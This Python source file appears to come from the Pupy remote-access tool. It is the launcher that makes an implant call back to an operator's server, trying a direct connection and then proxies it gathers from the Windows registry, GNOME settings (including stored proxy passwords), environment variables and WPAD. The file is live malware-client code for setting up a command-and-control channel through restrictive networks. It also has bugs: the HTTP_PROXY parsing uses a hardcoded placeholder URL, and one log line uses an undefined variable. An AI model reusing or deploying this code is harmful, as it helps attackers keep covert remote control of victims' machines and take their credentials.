# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from ..base_launcher import *
from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
import sys
import logging
import copy
import re
import os
import socket
import time
import subprocess
try:
	from urllib import request as urllib
except ImportError:
	import urllib2 as urllib

def parse_win_proxy(val):
	l=[]
	for p in val.split(";"):
		if "=" in p:
			tab=p.split("=",1)
			if tab[0]=="socks":
				tab[0]="SOCKS4"
			l.append((tab[0].upper(), tab[1], None, None)) #type, addr:port, username, password
		else:
			l.append(('HTTP', p, None, None))
	return l

last_wpad=None
def get_proxies(wpad_timeout=600):
	global last_wpad

	if sys.platform=="win32":
		#TODO retrieve all users proxy settings, not only HKCU
		from _winreg import OpenKey, CloseKey, QueryValueEx, HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, KEY_QUERY_VALUE
		aKey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings", 0, KEY_QUERY_VALUE)
		try:
			value=QueryValueEx(aKey,"ProxyServer")[0]
			if value:
				for p in parse_win_proxy(value):
					yield p
		except Exception:
			pass
		finally:
			CloseKey(aKey)

		aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings", 0, KEY_QUERY_VALUE)
		try:
			value=QueryValueEx(aKey,"ProxyServer")[0]
			if value:
				for p in parse_win_proxy(value):
					yield p
		except Exception: 
			pass
		finally:
			CloseKey(aKey)
	if "linux" in sys.platform:
		try:
			#retrieving gnome proxy settings
			subprocess.check_call("which gsettings > /dev/null", shell=True) #raise an exception in case of return code!=0
			try:
				host=subprocess.check_output("gsettings get org.gnome.system.proxy.http host", shell=True).strip(" \n'\"")
				port=subprocess.check_output("gsettings get org.gnome.system.proxy.http port", shell=True).strip(" \n'\"")
				user=subprocess.check_output("gsettings get org.gnome.system.proxy.http authentication-user", shell=True).strip(" \n'\"")
				password=subprocess.check_output("gsettings get org.gnome.system.proxy.http authentication-password", shell=True).strip(" \n'\"")
				if host and port:
					if not user:
						user=None
					if not password:
						password=None
					yield ('HTTP', "%s:%s"%(host,port), user, password)
			except Exception:
				pass
			try:
				host=subprocess.check_output("gsettings get org.gnome.system.proxy.https host", shell=True).strip(" \n'\"")
				port=subprocess.check_output("gsettings get org.gnome.system.proxy.https port", shell=True).strip(" \n'\"")
				if host and port:
					yield ('HTTP', "%s:%s"%(host,port), None, None)
			except Exception:
				pass
			try:
				host=subprocess.check_output("gsettings get org.gnome.system.proxy.socks host", shell=True).strip(" \n'\"")
				port=subprocess.check_output("gsettings get org.gnome.system.proxy.socks port", shell=True).strip(" \n'\"")
				if host and port:
					yield ('SOCKS4', "%s:%s"%(host,port), None, None)
					yield ('SOCKS5', "%s:%s"%(host,port), None, None)
			except Exception:
				pass

		except Exception:
			pass

	env_proxy=os.environ.get('HTTP_PROXY')
	if env_proxy:
		user, passwd, proxy=re.match("^(?:https?://)?(?:(?P<user>\w+):?(?P<password>\w*)@)?(?P<proxy_addr>\S+:[0-9]+)$","http://proxy.domain.com:3128").groups()
		yield ('HTTP', proxy, user, passwd)

	if last_wpad is None or time.time()-last_wpad > wpad_timeout: # to avoid flooding the network with wpad requests :)
		last_wpad=time.time()
		try:
			wpad_domain = socket.getfqdn("wpad")
			wpad_request = urllib.urlopen("http://%s/wpad.dat"%(wpad_domain))
			wpad_data = wpad_request.read()
			r=re.findall(r"PROXY\s+([a-zA-Z0-9.-]+:[0-9]+);?\s*", wpad_data)
			for p in r:
				yield ('HTTP', p, None, None)
		except Exception as e:
			pass



class AutoProxyLauncher(BaseLauncher):
	""" 
		Automatically search a HTTP/SOCKS proxy on the system and use that proxy with the specified TCP transport. 
		Also try without proxy if none of them are available/working
	"""
	def __init__(self, *args, **kwargs):
		super(AutoProxyLauncher, self).__init__(*args, **kwargs)
	def init_argparse(self):
		self.arg_parser = LauncherArgumentParser(prog="auto_proxy", description=self.__doc__)
		self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
		self.arg_parser.add_argument('--transport', choices=[x for x in network.conf.transports.iterkeys() if not x.endswith("_proxy")], default="tcp_ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
		self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
	def parse_args(self, args):
		self.args=self.arg_parser.parse_args(args)
		self.rhost, self.rport=None,None
		tab=self.args.host.rsplit(":",1)
		self.rhost=tab[0]
		if len(tab)==2:
			self.rport=int(tab[1])
		else:
			self.rport=443
		self.set_host("%s:%s"%(self.rhost, self.rport))
	def iterate(self):
		if self.args is None:
			raise LauncherError("parse_args needs to be called before iterate")

		opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
		
		#first we try without any proxy :
		try:
			t=copy.deepcopy(network.conf.transports[self.args.transport])
			client_args=t['client_kwargs']
			transport_args=t['client_transport_kwargs']
			for val in opt_args:
				if val.lower() in t['client_kwargs']:
					client_args[val.lower()]=opt_args[val]
				elif val.lower() in t['client_transport_kwargs']:
					transport_args[val.lower()]=opt_args[val]
				else:
					logging.warning("unknown transport argument : %s"%tab[0])
			logging.info("using client options: %s"%client_args)
			logging.info("using transports options: %s"%transport_args)
			try:
				client=t['client'](**client_args)
			except Exception as e:
				#at this point we quit if we can't instanciate the client
				raise SystemExit(e)
			logging.info("connecting to %s:%s using transport %s without any proxy ..."%(self.rhost, self.rport, self.args.transport))
			s=client.connect(self.rhost, self.rport)
			stream = t['stream'](s, t['client_transport'], transport_args)
			yield stream
		except StopIteration:
			raise
		except Exception as e:
			logging.error(e)

		#then with proxies
		for proxy_type, proxy, proxy_username, proxy_password in get_proxies():
			try:
				t=copy.deepcopy(network.conf.transports[self.args.transport])
				client_args=t['client_kwargs']
				transport_args=t['client_transport_kwargs']
				for val in opt_args:
					if val.lower() in t['client_transport_kwargs']:
						transport_args[val.lower()]=opt_args[val]
					else:
						client_args[val.lower()]=opt_args[val]
				if t['client'] is PupyTCPClient:
					t['client']=PupyProxifiedTCPClient
				elif t['client'] is PupySSLClient:
					t['client']=PupyProxifiedSSLClient
				else:
					raise SystemExit("proxyfication for client %s is not implemented"%str(t['client']))
				client_args["proxy_type"]=proxy_type.upper()
				proxy_addr, proxy_port=proxy.split(":",1)
				client_args["proxy_addr"]=proxy_addr
				client_args["proxy_port"]=proxy_port
				client_args["proxy_username"]=proxy_username
				client_args["proxy_password"]=proxy_password
				logging.info("using client options: %s"%client_args)
				logging.info("using transports options: %s"%transport_args)
				try:
					client=t['client'](**client_args)
				except Exception as e:
					#at this point we quit if we can't instanciate the client
					raise SystemExit(e)
				logging.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(self.rhost, self.rport, self.args.transport, proxy_type, proxy_addr, proxy_port))
				s=client.connect(self.rhost, self.rport)
				stream = t['stream'](s, t['client_transport'], transport_args)
				yield stream
			except StopIteration:
				raise
			except Exception as e:
				logging.error(e)


